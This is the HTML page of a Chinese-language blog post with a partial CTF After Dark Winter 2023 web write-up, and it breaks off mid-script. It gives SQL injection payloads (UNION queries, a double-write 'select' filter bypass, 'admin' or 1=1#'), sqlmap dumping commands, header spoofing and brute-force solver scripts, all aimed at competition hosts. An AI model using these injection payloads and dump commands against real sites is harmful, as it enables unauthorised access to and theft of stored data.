@@ -1,0 +1,607 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/XFUN%E6%B0%B4%E6%AF%8D%E6%9A%97%E9%BB%91%E7%89%88-%E6%9C%AA%E9%80%89%E4%B8%AD.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/XFUN%E6%B0%B4%E6%AF%8D%E6%9A%97%E9%BB%91%E7%89%88-%E6%9C%AA%E9%80%89%E4%B8%AD.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="CTF After Dark Winter 2023的部分wp">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTF-After-Dark-Winter-2023部分wp">
+<meta property="og:url" content="http://example.com/2023/03/02/CTF-After-Dark-Winter-2023%E9%83%A8%E5%88%86wp/index.html">
+<meta property="og:site_name" content="LinTu&#39;s Blog">
+<meta property="og:description" content="CTF After Dark Winter 2023的部分wp">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img.mjj.today/2023/03/03/e76bd4177bf31da151ddcafa748b9230.png">
+<meta property="og:image" content="https://img.mjj.today/2023/03/03/5c7c9f0c6ad3c9ff1329e8e11ce3353f.png">
+<meta property="og:image" content="https://img.mjj.today/2023/03/03/5934296ab072814fe6041a8254562fd4.png">
+<meta property="og:image" content="https://img.mjj.today/2023/03/03/1605e8817747775932563f3e2621ea78.png">
+<meta property="article:published_time" content="2023-03-02T01:43:02.000Z">
+<meta property="article:modified_time" content="2023-07-27T03:35:40.240Z">
+<meta property="article:author" content="林涂">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img.mjj.today/2023/03/03/e76bd4177bf31da151ddcafa748b9230.png">
+
+<link rel="canonical" href="http://example.com/2023/03/02/CTF-After-Dark-Winter-2023%E9%83%A8%E5%88%86wp/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>CTF-After-Dark-Winter-2023部分wp | LinTu's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="LinTu's Blog" type="application/atom+xml">
+<style>.darkmode--activated{--body-bg-color:#282828;--content-bg-color:#333;--card-bg-color:#555;--text-color:#ccc;--blockquote-color:#bbb;--link-color:#ccc;--link-hover-color:#eee;--brand-color:#ddd;--brand-hover-color:#ddd;--table-row-odd-bg-color:#282828;--table-row-hover-bg-color:#363636;--menu-item-bg-color:#555;--btn-default-bg:#222;--btn-default-color:#ccc;--btn-default-border-color:#555;--btn-default-hover-bg:#666;--btn-default-hover-color:#ccc;--btn-default-hover-border-color:#666;--highlight-background:#282b2e;--highlight-foreground:#a9b7c6;--highlight-gutter-background:#34393d;--highlight-gutter-foreground:#9ca9b6}.darkmode--activated img{opacity:.75}.darkmode--activated img:hover{opacity:.9}.darkmode--activated code{color:#69dbdc;background:0 0}button.darkmode-toggle{z-index:9999}.darkmode-ignore,img{display:flex!important}.beian img{display:inline-block!important}</style></head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">LinTu's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-guestbook">
+
+    <a href="/guestbook/" rel="section"><i class="fa fa-book fa-fw"></i>留言板</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/03/02/CTF-After-Dark-Winter-2023%E9%83%A8%E5%88%86wp/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/header.jpg">
+      <meta itemprop="name" content="林涂">
+      <meta itemprop="description" content="学习ing">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="LinTu's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          CTF-After-Dark-Winter-2023部分wp
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-03-02 09:43:02" itemprop="dateCreated datePublished" datetime="2023-03-02T09:43:02+08:00">2023-03-02</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-07-27 11:35:40" itemprop="dateModified" datetime="2023-07-27T11:35:40+08:00">2023-07-27</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/" itemprop="url" rel="index"><span itemprop="name">做题记录</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/2023/03/02/CTF-After-Dark-Winter-2023%E9%83%A8%E5%88%86wp/" class="post-meta-item leancloud_visitors" data-flag-title="CTF-After-Dark-Winter-2023部分wp" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2023/03/02/CTF-After-Dark-Winter-2023%E9%83%A8%E5%88%86wp/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2023/03/02/CTF-After-Dark-Winter-2023%E9%83%A8%E5%88%86wp/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>CTF After Dark Winter 2023的部分wp</p>
+<span id="more"></span>
+<p>感谢友善帮助我的syy和potato🙏</p>
+<h2 id="Bagels"><a href="#Bagels" class="headerlink" title="Bagels"></a>Bagels</h2><p>右键查看源代码，<code>script.js</code>文件里<br>直接查看网页cookie也可以</p>
+<h2 id="Birthday"><a href="#Birthday" class="headerlink" title="Birthday"></a>Birthday</h2><p>右键查看源代码</p>
+<h2 id="Cat"><a href="#Cat" class="headerlink" title="Cat"></a>Cat</h2><p>由题意得，机器小猫，在url末端加上<code>robots.txt</code>可以看到<code>Disallow: /cat/vet.html</code>，把url末端改成这个。</p>
+<h2 id="Mean-Girls"><a href="#Mean-Girls" class="headerlink" title="Mean Girls"></a>Mean Girls</h2><p>右键查看源代码，在<code>login-page.js</code>文件里可以看到</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (username === <span class="string">&quot;admin&quot;</span> &amp;&amp; password === <span class="string">&quot;cybersecure&quot;</span>) &#123;</span><br><span class="line">       <span class="title function_">alert</span>(<span class="string">&quot;You have successfully logged in.&quot;</span>);</span><br><span class="line">       location.<span class="property">href</span> = <span class="string">&#x27;flag.html&#x27;</span>;</span><br></pre></td></tr></table></figure>
+<p>在login页面输入username和password（直接在url末端加<code>/flag.html</code>应该也可以</p>
+<p>在flag.html页面可以找到<code>iodj&#123;rq_z3gq3vg4bv_z3_zh4u_s1qn&#125;</code><br>结合名字<code>caesar</code>可知是凯撒密码，位移是3</p>
+<h2 id="Star-Poet-Blog"><a href="#Star-Poet-Blog" class="headerlink" title="Star Poet Blog"></a>Star Poet Blog</h2><p>题中诗的url末端都是<code>/achieve/xxx.txt</code>结合题干，在<code>/achieve/</code>后面加<code>password.txt</code><br>得到<code>flag&#123;1377_2127_3343_4241_5864&#125;</code><br>结合poetry 101: what’s a poem?这个链接，得知第一个数字代表第几首诗，第二个数字代表第几段，第三个数字代表第几行，第四个数字代表第几个单词，解出flag</p>
+<h2 id="Secure-Platform"><a href="#Secure-Platform" class="headerlink" title="Secure Platform"></a>Secure Platform</h2><p>点击<code>Get your flag!</code>按键，页面提示<code>Your platform is &quot;Windows&quot;, I&#39;d much rather it be &quot;INTEGRITY-178B&quot;.</code>，用bp抓包改一下<code>Sec-Ch-Ua-Platform</code>部分</p>
+<h2 id="Bank"><a href="#Bank" class="headerlink" title="Bank"></a>Bank</h2><p>过滤了select，好吧我连堆叠注入都在尝试了，然后善良的syy告诉我，直接双写绕过就好了（我是若汁啊啊啊啊啊啊啊啊</p>
+<ol>
+<li><p><code>username=&#39; order by 3 #&amp;password=1</code>没报错<br><code>username=&#39; order by 4 #&amp;password=1</code>报错<br>说明表是三列的</p>
+</li>
+<li><p><code>username=&#39; union selselectect 1,2,3#&amp;password=1</code></p>
+</li>
+<li><p>查库名<code>username=&#39; union selselectect 1,2,schema_name from information_schema.schemata#&amp;password=1</code><br>库名为bankdb</p>
+</li>
+<li><p>查表名<code>username=&#39; union selselectect 1,2,table_name from information_schema.tables where table_schema=&#39;bankdb&#39;#&amp;password=1</code><br>表名为flags和users</p>
+</li>
+<li><p>查列名<code>username=&#39; union selselectect 1,2,column_name from information_schema.columns where table_name=&#39;flags&#39;#&amp;password=1</code><br>列名为flag和value（后知后觉题目给了（悲</p>
+</li>
+<li><p>查字段<code>username=&#39; union selselectect 1,2,concat_ws(&#39;:&#39;,flag,value) from bankdb.flags#&amp;password=1</code></p>
+</li>
+</ol>
+<h2 id="Cookies"><a href="#Cookies" class="headerlink" title="Cookies"></a>Cookies</h2><p>这道题摸不着头脑半天，善良的potato说题目意思应该是cookie随机一个1000以内的值，如果随机到它想要的就可以得到flag。。。<br>bp爆破一下cookie请求头就可以叻<br>（btw如果足够幸运是不是有概率一下子随机到正确的cookie值。。</p>
+<h2 id="Injection-Perfection"><a href="#Injection-Perfection" class="headerlink" title="Injection Perfection"></a>Injection Perfection</h2><p>这道题看起来是node.js写的，源码也看不明白，题也不会做。。大概过滤了井号大于小于等于这样。。。？</p>
+<p>但是。。。没关系。。。sqlmap堂堂出场。。。。<br>（是的本人是一个只会借助工具的没用的东西（悲</p>
+<ol>
+<li><p>首先。。<br><code>python sqlmap.py -u &quot;https://injection-perfection.acmcyber.com/&quot; --data=&quot;username=joe&amp;password=bruin&quot;</code><br>出来一堆乱糟糟的。。看也看不懂。。。。。</p>
+</li>
+<li><p>没关系。。。看看数据库。。。<br><code>python sqlmap.py -u &quot;https://injection-perfection.acmcyber.com/&quot; --data=&quot;username=joe&amp;password=bruin&quot; -dbs</code><br>又是一堆乱糟糟的。。。没关系。。。。我乱搞一下</p>
+</li>
+<li><p>查一下表名吧<br><code>python sqlmap.py -u &quot;https://injection-perfection.acmcyber.com/&quot; --data=&quot;username=joe&amp;password=bruin&quot; --tables</code><br><img src="https://img.mjj.today/2023/03/03/e76bd4177bf31da151ddcafa748b9230.png" alt="e76bd4177bf31da151ddcafa748b9230.png"><br>所以数据库是<code>SQLite_masterdb</code>，表名是<code>users</code></p>
+</li>
+<li><p>查列名<code>python sqlmap.py -u &quot;https://injection-perfection.acmcyber.com/&quot; --data=&quot;username=joe&amp;password=bruin&quot; -T users --columns</code><br><img src="https://img.mjj.today/2023/03/03/5c7c9f0c6ad3c9ff1329e8e11ce3353f.png" alt="5c7c9f0c6ad3c9ff1329e8e11ce3353f.png"></p>
+</li>
+<li><p>查字段<code>python sqlmap.py -u &quot;https://injection-perfection.acmcyber.com/&quot; --data=&quot;username=joe&amp;password=bruin&quot; -T users -C fav_color,password,username --dump</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">+----------+--------------------------------------+------------+</span><br><span class="line">| fav_color| password                             | username   |</span><br><span class="line">+----------+--------------------------------------+------------+</span><br><span class="line">| blue     | bruin                                | joe        |</span><br><span class="line">| red      | bedwarsplayersarelikefliesexceptflies| gamerboy80 |</span><br><span class="line">| flag&#123;**&#125; | *******                              | admin      |</span><br><span class="line">+----------+--------------------------------------+------------+</span><br></pre></td></tr></table></figure></li>
+</ol>
+<p>复现：<br>由</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">const attemptLogin <span class="operator">=</span> (username, password) <span class="operator">=</span><span class="operator">&gt;</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">new</span> Promise((resolve, reject) <span class="operator">=</span><span class="operator">&gt;</span> &#123;</span><br><span class="line">		db.get(`<span class="keyword">SELECT</span> username, password <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username<span class="operator">=</span><span class="string">&#x27;$&#123;username&#125;&#x27;</span>`, async (err, <span class="type">row</span>) <span class="operator">=</span><span class="operator">&gt;</span> &#123;</span><br><span class="line">			if (err)</span><br><span class="line">				<span class="keyword">return</span> reject(err);</span><br><span class="line">			<span class="keyword">else</span> if (<span class="type">row</span> <span class="operator">=</span><span class="operator">=</span><span class="operator">=</span> undefined)</span><br><span class="line">				<span class="keyword">return</span> reject(<span class="string">&#x27;Invalid User&#x27;</span>);</span><br><span class="line">			<span class="keyword">else</span> if (password <span class="operator">=</span><span class="operator">=</span><span class="operator">=</span> row.password)</span><br><span class="line">				<span class="keyword">return</span> resolve(`My favorite color <span class="keyword">is</span> $&#123;await getFavColor(row.username)&#125;`);</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				<span class="keyword">return</span> reject(<span class="string">&#x27;incorrect password&#x27;</span>);</span><br><span class="line">		&#125;);</span><br><span class="line">	&#125;)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>构建payload:<code>&quot;password=aaa&amp;username=a&#39; union select &#39;admin&#39;,&#39;aaa&#39; --+&quot;</code></p>
+<h2 id="SQL-Prevention-101"><a href="#SQL-Prevention-101" class="headerlink" title="SQL Prevention-101"></a>SQL Prevention-101</h2><p>随便一个万能密码belike<code>admin&#39; or 1=1#</code></p>
+<h2 id="What’s-on-the-Menu"><a href="#What’s-on-the-Menu" class="headerlink" title="What’s on the Menu?"></a>What’s on the Menu?</h2><ol>
+<li>由题意得，bp打开，GET改成POST</li>
+<li>由<code>Only the elite who used MenuBrowser can access the menu!</code>得，把<code>User-Agent</code>的值改为<code>MenuBrowser</code></li>
+<li>由<code>Only those who were referred by https://yelp.com can access the menu!</code>得，加个请求头<code>Referer: https://yelp.com</code></li>
+</ol>
+<h2 id="Jester"><a href="#Jester" class="headerlink" title="Jester"></a>Jester</h2><p>已知是四位数加四位数，每一秒内都会换一道题。。。。所以算式的值会是从0到19999，如果用bp爆破一下从0到19999。。。。<br>那么一次撞大运能有1&#x2F;20000撞到，即19999&#x2F;20000的概率撞不到，撞20000次撞不到的概率为（19999&#x2F;20000）^20000 &#x3D; 0.36787<br>所以20000次能撞到数字正确的概率约为0.632.。。</p>
+<p><img src="https://img.mjj.today/2023/03/03/5934296ab072814fe6041a8254562fd4.png" alt="5934296ab072814fe6041a8254562fd4.png"></p>
+<p>然后把撞出来的页面show response in browser，看到第二题是一元二次方程，依旧是一秒换一题，然后因为式子只有加号所以方程的解为负，而且四舍五入为整数，所以以两个解的值在-100到0再次爆破一下<br><img src="https://img.mjj.today/2023/03/03/1605e8817747775932563f3e2621ea78.png" alt="1605e8817747775932563f3e2621ea78.png"><br>emmmmmmm…</p>
+<p>然后其实我本来的思路是写个Python，读取页面然后解方程式，Python跑的速度加传参的速度，有几率在1秒内跑完并且传参<br>然后我代码都搞到了改完了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="comment"># 发送HTTP请求并解析HTML</span></span><br><span class="line">url = <span class="string">&quot;https://jester.acmcyber.com/validate&quot;</span></span><br><span class="line">response = requests.get(url)</span><br><span class="line">soup = BeautifulSoup(response.text, <span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line"><span class="comment"># 找到所有的&lt;p&gt;标签并获取包含算式的文本内容</span></span><br><span class="line">p_tags = soup.find_all(<span class="string">&#x27;p&#x27;</span>)</span><br><span class="line">text = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> p_tags:</span><br><span class="line">    <span class="keyword">match</span> = re.search(<span class="string">r&#x27;(\d+)\s*\+\s*(\d+)&#x27;</span>, p.text)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">        text = <span class="keyword">match</span>.group(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="comment"># 使用eval()函数计算算式的结果</span></span><br><span class="line"><span class="keyword">if</span> text:</span><br><span class="line">    operands = [<span class="built_in">int</span>(op) <span class="keyword">for</span> op <span class="keyword">in</span> text.split(<span class="string">&quot; + &quot;</span>)]</span><br><span class="line">    result = <span class="built_in">sum</span>(operands)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;算式:&quot;</span>, text)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;结果:&quot;</span>, result)</span><br><span class="line">    <span class="comment"># 将结果POST到表单中</span></span><br><span class="line">    form_data = &#123;<span class="string">&quot;answer&quot;</span>: <span class="built_in">str</span>(result)&#125;</span><br><span class="line">    response = requests.post(url, data=form_data)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;已将结果POST到表单中！&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;未找到算式！&quot;</span>)</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">soup = BeautifulSoup(response.text, <span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line"><span class="comment"># 找到所有的&lt;p&gt;标签并获取包含算式的文本内容</span></span><br><span class="line">p_tags = soup.find_all(<span class="string">&#x27;p&#x27;</span>)</span><br><span class="line">text = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> p_tags:</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;What are the roots of&quot;</span> <span class="keyword">in</span> p.text:</span><br><span class="line">        text = p.text.strip()</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="comment"># 解析算式并计算结果</span></span><br><span class="line"><span class="keyword">if</span> text:</span><br><span class="line">    <span class="comment"># 使用正则表达式匹配算式中的系数</span></span><br><span class="line">    pattern = <span class="string">r&#x27;(\d+)\s*x\^2\s*\+\s*(\d+)\s*x\s*\+\s*(\d+)&#x27;</span></span><br><span class="line">    <span class="keyword">match</span> = re.search(pattern, text)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">        a, b, c = <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">1</span>)), <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">2</span>)), <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">3</span>))</span><br><span class="line">        <span class="comment"># 计算一元二次方程的解</span></span><br><span class="line">        delta = b**<span class="number">2</span> - <span class="number">4</span>*a*c</span><br><span class="line">        <span class="keyword">if</span> delta &lt; <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;无实数解！&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> delta == <span class="number">0</span>:</span><br><span class="line">            x = -b / (<span class="number">2</span>*a)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;唯一实数解：&quot;</span>, x)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            x1 = (-b + delta**<span class="number">0.5</span>) / (<span class="number">2</span>*a)</span><br><span class="line">            x2 = (-b - delta**<span class="number">0.5</span>) / (<span class="number">2</span>*a)</span><br><span class="line">            x1_rounded = <span class="built_in">round</span>(x1)</span><br><span class="line">            x2_rounded = <span class="built_in">round</span>(x2)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;两个实数解：&quot;</span>, x1_rounded, x2_rounded)</span><br><span class="line">        <span class="comment"># 将解POST到表单中</span></span><br><span class="line">        form_data = &#123;<span class="string">&quot;answer&quot;</span>: <span class="built_in">str</span>(result),<span class="string">&quot;answer1&quot;</span>: <span class="built_in">str</span>(x1_rounded), <span class="string">&quot;answer2&quot;</span>: <span class="built_in">str</span>(x2_rounded)&#125;</span><br><span class="line">        response = requests.post(url+<span class="string">&quot;&quot;</span>, data=form_data)</span><br><span class="line">        <span class="comment"># 输出POST请求后的HTML源代码</span></span><br><span class="line">        <span class="built_in">print</span>(response.text)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;算式格式不正确！&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;未找到算式！&quot;</span>)</span><br></pre></td></tr></table></figure>
+<p>平均速度在0.7秒到1.7秒内。。多跑几次就可以跑出来，然而出现了一个问题。。.<br>因为两题的URL是同一个，所以每次post answer1和answer2都会post到第一题上去（悲<br>potato说是第二题比第一题多个cookie，而Python好像没法区分，然后我寻思如果python再传一个cookie请求头会不会超出一秒（而且也太麻烦了我不会写<br>遂作罢。。。。。。</p>
+<p>学长的代码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;https://jester.acmcyber.com/validate&quot;</span></span><br><span class="line">session = requests.Session()</span><br><span class="line">ssss = session.get(url=url)</span><br><span class="line"></span><br><span class="line">soup = BeautifulSoup(ssss.text, <span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line">addition_problem = soup.find(<span class="string">&#x27;p&#x27;</span>, text=<span class="keyword">lambda</span> x: <span 